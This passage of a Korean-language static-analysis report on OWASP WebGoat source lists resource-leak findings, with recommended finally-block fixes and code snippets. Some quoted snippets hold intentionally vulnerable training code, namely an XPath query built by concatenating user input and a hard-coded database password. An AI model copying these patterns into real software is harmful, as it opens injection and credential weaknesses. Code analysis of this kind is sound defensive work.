<Value>1. 리소스를 다시 확보하는 데 finalize()를 사용하지 마십시오. 개체의 finalize() 메서드를 호출하려면 가비지 수집기(garbage collector)는 개체가 가비지 수집 대상인지 판단해야 합니다. 가비지 수집기(garbage collector)는 JVM이 메모리가 부족한 경우를 제외하고는 실행할 필요가 없기 때문에 finalize() 메서드가 필요할 때 원하는 대로 호출된다는 보장이 없습니다. 또한 결국 가비지 수집기(garbage collector)가 실행되더라도 짧은 시간에 방대한 리소스를 다시 확보하기 때문에 성능이 "고르지 못하고" 전반적인 시스템 처리량이 낮아질 수 있습니다. 이런 효과는 시스템의 부하가 증가할수록 더욱 두드러집니다.

마지막으로 리소스 확보 작업이 응답하지 않도록 할 수 있으면(예: 네트워크로 데이터베이스와 통신해야 하는 경우), finalize() 메서드를 실행하고 있는 스레드도 응답하지 않습니다.

2. finally 블록의 리소스를 해제하십시오. 예제 코드는 다음과 같이 다시 작성해야 합니다.


public void processFile(String fName) throws FileNotFoundException, IOException {
  FileInputStream fis;
  try {
    fis = new FileInputStream(fName);
    int sz;
    byte[] byteArray = new byte[BLOCK_SIZE];
    while ((sz = fis.read(byteArray)) != -1) {
      processBytes(byteArray, sz);
    }
  }
  finally {
    if (fis != null) {
      safeClose(fis);
    }
  }
}

public static void safeClose(FileInputStream fis) {
  if (fis != null) {
    try {
      fis.close();
    } catch (IOException e) {
      log(e);
    }
  }
}


이 해결책은 도우미 함수를 사용하여 스트림을 닫으려고 할 때 발생할 수 있는 예외를 기록합니다. 이 도우미 함수는 스트림을 닫아야 할 때마다 재사용됩니다.

또한 processFile 메서드는 fis 개체를 null로 초기화하지 않습니다. 대신 safeClose()를 호출하기 전에 fis가 null이 아닌지 검사합니다. null 검사를 하지 않으면 Java 컴파일러는 fis가 초기화되지 않았다고 보고합니다. 이 방법은 uninitialized variable을 발견하는 Java 기능을 이용한 것입니다. fis를 더 복잡한 방법을 사용하여 null로 초기화하면 초기화하지 않고 fis를 사용하는 경우를 컴파일러가 발견할 수 없습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>15</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="6A452E3BFF473737F95196432C59610A" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AbstractLesson.java의 getSource() 함수는 670 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>669</LineStart>
<Snippet>	    // System.out.println("Loading source file: " +
	    // getSourceFileName());
	    src = convertMetacharsJavaCode(readFromFile(new BufferedReader(
		    new FileReader(s.getWebResource(getSourceFileName()))),
		    true));</Snippet>
<TargetFunction>readFromFile(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="42AB68D270545768293D3D37571A4EFE" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>XPATHInjection.java의 createContent() 함수는 155 줄의 FileInputStream()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>155</LineStart>
<Snippet>	    XPathFactory factory = XPathFactory.newInstance();
	    XPath xPath = factory.newXPath();
	    InputSource inputSource = new InputSource(new FileInputStream(d));
	    String expression = "/employees/employee[loginID/text()='"
		    + username + "' and passwd/text()='" + password + "']";</Snippet>
<TargetFunction>new FileInputStream(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C4EC2EDAF3F91A3A50B5499E737521B1" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>LessonAdapter.java의 createContent() 함수는 93 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>93</LineStart>
<Snippet>	    {
		PRE pre = new PRE();
		BufferedReader in = new BufferedReader(new FileReader(fileName));
		String line = null;
		while ((line = in.readLine()) != null)</Snippet>
<TargetFunction>in = new BufferedReader(new java.io.FileReader())</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="13D5F7ED75A3AB864A34A5714569EF66" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Challenge2Screen.java의 isDefaced() 함수는 383 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>383</LineStart>
<Snippet>	    String defacedText = getFileText(new BufferedReader(new FileReader(
		    origpath)), false);
	    String origText = getFileText(new BufferedReader(new FileReader(
		    masterFilePath)), false);
</Snippet>
<TargetFunction>getFileText(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D56D1FEF7BB4EBA49C9A395DF0D88AC4" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AbstractLesson.java의 makeSourceDump_DELETEME() 함수는 955 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>954</LineStart>
<Snippet>		    .addElement(new TR()
			    .addElement(new TD()
				    .addElement(convertMetachars(readFromFile(
					    new BufferedReader(new FileReader(
						    filename)), true)))));</Snippet>
<TargetFunction>readFromFile(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1C63C03CDAD3AAC473C04FED33047A6E" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Challenge2Screen.java의 resetWebPage() 함수는 434 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>434</LineStart>
<Snippet>	    File usersFile = new File(defacedpath);
	    FileWriter fw = new FileWriter(usersFile);
	    fw.write(getFileText(new BufferedReader(new FileReader(
		    masterFilePath)), false));
	    fw.close();</Snippet>
<TargetFunction>getFileText(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="15C50D550084CFABCE3D6DBB896ACCE3" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AbstractLesson.java의 readFromURL() 함수는 1032 줄의 getInputStream()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1031</LineStart>
<Snippet>	    URL u = new URL(url);
	    HttpURLConnection huc = (HttpURLConnection) u.openConnection();
	    BufferedReader reader = new BufferedReader(new InputStreamReader(
		    huc.getInputStream()));
	    String line;</Snippet>
<TargetFunction>reader = new BufferedReader(new java.io.InputStreamReader())</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="48CFC4960DE0E45B88DAE1B75077B409" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Challenge2Screen.java의 showDefaceAttempt() 함수는 406 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>406</LineStart>
<Snippet>	String defaced = getFileText(new BufferedReader(
		new FileReader(origpath)), false);
	String origText = getFileText(new BufferedReader(new FileReader(s
		.getContext().getRealPath(WEBGOAT_CHALLENGE_JSP))), false);
</Snippet>
<TargetFunction>getFileText(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CB8421F4774F0AA99840B6DD04FD0829" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>LessonAdapter.java의 getInstructions() 함수는 285 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>285</LineStart>
<Snippet>	    if (fileName != null)
	    {
		BufferedReader in = new BufferedReader(new FileReader(fileName));
		String line = null;
		boolean startAppending = false;</Snippet>
<TargetFunction>in = new BufferedReader(new java.io.FileReader())</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="49AC82522DFE5219AF616B4DD208B330" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Challenge2Screen.java의 resetWebPage() 함수는 433 줄의 FileWriter()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	    // replace the defaced text with the original
	    File usersFile = new File(defacedpath);
	    FileWriter fw = new FileWriter(usersFile);
	    fw.write(getFileText(new BufferedReader(new FileReader(
		    masterFilePath)), false));</Snippet>
<TargetFunction>fw = new FileWriter(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="48CFC4960DE0E45B88DAE1B75077B408" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Challenge2Screen.java의 showDefaceAttempt() 함수는 405 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>404</LineStart>
<Snippet>	String origpath = s.getContext().getRealPath(
		WEBGOAT_CHALLENGE + "_" + s.getUserName() + JSP);
	String defaced = getFileText(new BufferedReader(
		new FileReader(origpath)), false);
	String origText = getFileText(new BufferedReader(new FileReader(s</Snippet>
<TargetFunction>getFileText(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="13D5F7ED75A3AB864A34A5714569EF65" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Challenge2Screen.java의 isDefaced() 함수는 381 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>381</LineStart>
<Snippet>	    String masterFilePath = s.getContext().getRealPath(
		    WEBGOAT_CHALLENGE_JSP);
	    String defacedText = getFileText(new BufferedReader(new FileReader(
		    origpath)), false);
	    String origText = getFileText(new BufferedReader(new FileReader(</Snippet>
<TargetFunction>getFileText(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="106C950FC6B8B677064B203028BDB065" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WebgoatProperties.java의 WebgoatProperties() 함수는 43 줄의 FileInputStream()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>43</LineStart>
<Snippet>	try
	{
	    FileInputStream in = new FileInputStream(propertiesFileName);
	    load(in);
	}</Snippet>
<TargetFunction>in = new FileInputStream(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8D2F9470457AA1DBB019D65452C98DCC" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>AbstractLesson.java의 getLessonPlan() 함수는 567 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>567</LineStart>
<Snippet>	    // System.out.println("Loading lesson plan file: " +
	    // getLessonPlanFileName());
	    src = readFromFile(new BufferedReader(new FileReader(s
		    .getWebResource(getLessonPlanFileName()))), false);
</Snippet>
<TargetFunction>readFromFile(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C18864ACC2F321D56CB007715E732C95" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>PathBasedAccessControl.java의 createContent() 함수는 193 줄의 FileReader()에 의해 할당된 시스템 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>192</LineStart>
<Snippet>			throw new Exception("File is too large");
		    }
		    String fileData = getFileText(new BufferedReader(
			    new FileReader(f)), false);
		    if (fileData.indexOf(0x00) != -1)</Snippet>
<TargetFunction>getFileText(new java.io.BufferedReader(), ?)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="13">
                        <groupTitle>Unreleased Resource: Database</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>SoapRequest.java의 getResults() 함수는 412 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>리소스 누출은 최소한 두 가지 공통 원인이 있습니다.

- 오류 조건 및 기타 예외 상황.

- 프로그램의 어떤 부분이 리소스 해제를 담당하고 있는지에 대한 혼란

대부분의 공개되지 않은 리소스 문제는 일반적인 소프트웨어 안정성 문제를 일으킵니다. 하지만 공격자가 의도적으로 리소스 누출을 일으킬 수 있는 경우 공격자가 리소스 풀을 고갈시켜 DoS(Denial of Service) 공격을 실행할 수도 있습니다.

예제: 일반적인 조건에서 다음 코드는 데이터베이스 쿼리를 실행하고 데이터베이스가 반환한 결과를 처리한 다음 할당된 statement 개체를 닫습니다. 하지만 SQL을 실행하거나 결과를 처리하는 동안 예외 사항이 발생하면 statement 개체는 닫히지 않습니다. 이런 일이 자주 발생하면 데이터베이스에 사용 가능한 커서가 부족하게 되어 SQL 쿼리를 더 이상 실행할 수 없습니다.

  Statement stmt = conn.createStatement();
  ResultSet rs = stmt.executeQuery(CXN_SQL);
  harvestResults(rs);
  stmt.close();
&#13;
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>1. 리소스를 다시 확보하는 데 finalize()를 사용하지 마십시오. 개체의 finalize() 메서드를 호출하려면 가비지 수집기(garbage collector)는 개체가 가비지 수집 대상인지 판단해야 합니다. 가비지 수집기(garbage collector)는 JVM이 메모리가 부족한 경우를 제외하고는 실행할 필요가 없기 때문에 finalize() 메서드가 필요할 때 원하는 대로 호출된다는 보장이 없습니다. 또한 결국 가비지 수집기(garbage collector)가 실행되더라도 짧은 시간에 방대한 리소스를 다시 확보하기 때문에 성능이 "고르지 못하고" 전반적인 시스템 처리량이 낮아질 수 있습니다. 이런 효과는 시스템의 부하가 증가할수록 더욱 두드러집니다.

마지막으로 리소스 확보 작업이 응답하지 않도록 할 수 있으면(예: 네트워크로 데이터베이스와 통신해야 하는 경우), finalize() 메서드를 실행하고 있는 스레드도 응답하지 않습니다.

2. finally 블록의 리소스를 해제하십시오. 예제 코드는 다음과 같이 다시 작성해야 합니다.


  public void execCxnSql(Connection conn) {
    Statement stmt;
    try {
      stmt = conn.createStatement();
      ResultSet rs = stmt.executeQuery(CXN_SQL);
      ...
    }
    finally {
      if (stmt != null) {
        safeClose(stmt);
      }
    }
}

public static void safeClose(Statement stmt) {
  if (stmt != null) {
    try {
      stmt.close();
    } catch (SQLException e) {
      log(e);
    }
  }
}


이 해결책은 도우미 함수를 사용하여 statement를 닫으려 할 때 발생할 수 있는 예외를 기록합니다. 도우미 함수는 statement를 닫을 때마다 재사용될 것입니다.

또한 execCxnSql 메서드는 stmt 개체를 null로 초기화하지 않습니다. 대신 safeClose()를 호출하기 전에 stmt가 null이 아닌지 검사합니다. null 검사를 하지 않으면 Java 컴파일러는 stmt가 초기화되지 않았다고 보고합니다. 이 방법은 uninitialized variable을 발견하는 Java 기능을 이용한 것입니다. stmt를 더 복잡한 방법을 사용하여 null로 초기화하면 초기화하지 않고 stmt를 사용하는 경우를 컴파일러가 발견할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 데이터베이스 연결을 닫으면 연결 개체와 연관된 다른 리소스가 자동으로 해제될 수도 있고 그렇지 않을 수도 있습니다. 응용 프로그램이 연결 풀링을 사용하는 경우에는 연결을 닫은 후에 다른 리소스를 명시적으로 닫는 것이 좋습니다. 응용 프로그램이 연결 풀링을 사용하지 않을 경우에는 데이터베이스 연결을 닫으면 다른 리소스도 자동으로 닫힙니다. 이러한 경우, 이 취약점은 유효하지 않습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>13</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="451A17229ADFC2431B64826831C3B627" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WsSqlInjection.java의 getResults() 함수는 229 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>237</LineStart>
<Snippet>	    try
	    {
		Statement statement = connection.createStatement(
			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);</Snippet>
<TargetFunction>statement = connection.createStatement(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="04ED8DE06DF66F9C36907FBF82DEB835" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SoapRequest.java의 getResults() 함수는 412 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>418</LineStart>
<Snippet>	    }
	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try</Snippet>
<TargetFunction>ps = connection.prepareStatement(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1633DEC41E18BD7F8A60AFD79EFA55AD" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WSDLScanning.java의 getResults() 함수는 274 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>274</LineStart>
<Snippet>	try
	{
	    Connection connection = DatabaseUtilities.makeConnection();
	    if (connection == null)
	    {</Snippet>
<TargetFunction>connection = makeConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1FFACC17DFC8579777D6FFD9384C71DC" ruleID="789BB115-AAF5-4C03-BBC2-C4CFCC74C13A">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 70 줄의 getConnection()에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>91</LineStart>
<Snippet>		    ResultSet.TYPE_SCROLL_INSENSITIVE,
		    ResultSet.CONCUR_READ_ONLY);
	    ResultSet answer_results = answer_statement.executeQuery(query);
	    answer_results.first();
	    int employeeId = answer_results.getInt("userid");</Snippet>
<TargetFunction>answer_results = answer_statement.executeQuery(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1A190EDA4C62457810D8ED1385AAAC6C" ruleID="789BB115-AAF5-4C03-BBC2-C4CFCC74C13A">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WSDLScanning.java의 getResults() 함수는 274 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>284</LineStart>
<Snippet>	    try
	    {
		ResultSet results = ps.executeQuery();
		if ((results != null) &amp;&amp; (results.next() == true))
		{</Snippet>
<TargetFunction>results = ps.executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3A61CC50D67E795CD5D9C72962426B3D" ruleID="789BB115-AAF5-4C03-BBC2-C4CFCC74C13A">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SoapRequest.java의 getResults() 함수는 412 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>422</LineStart>
<Snippet>	    try
	    {
		ResultSet results = ps.executeQuery();
		if ((results != null) &amp;&amp; (results.next() == true))
		{</Snippet>
<TargetFunction>results = ps.executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CD4E7D142D4170819A026198F9748EFD" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 70 줄의 getConnection()에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>70</LineStart>
<Snippet>
	    connection = DriverManager
		    .getConnection(
			    "jdbc:odbc:;DRIVER=Microsoft Access Driver (*.mdb);DBQ=c:/webgoat.mdb;PWD=webgoat",
			    "webgoat", "webgoat");</Snippet>
<TargetFunction>connection = getConnection(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9E04332C771DC6643C26B2FD61F35F93" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SoapRequest.java의 getResults() 함수는 412 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>412</LineStart>
<Snippet>	try
	{
	    Connection connection = DatabaseUtilities.makeConnection();
	    if (connection == null)
	    {</Snippet>
<TargetFunction>connection = makeConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FEA45A3D84A912105A0DEA1F42093C48" ruleID="EC71C442-6E66-45DF-9890-41A5156B1CD0">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WSDLScanning.java의 getResults() 함수는 274 줄의 &lt;a href="location://JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java###82###5###0"&gt;makeConnection()&lt;/a&gt;에 의해 할당된 데이터베이스 리소스를 해제하지 못할 수도 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
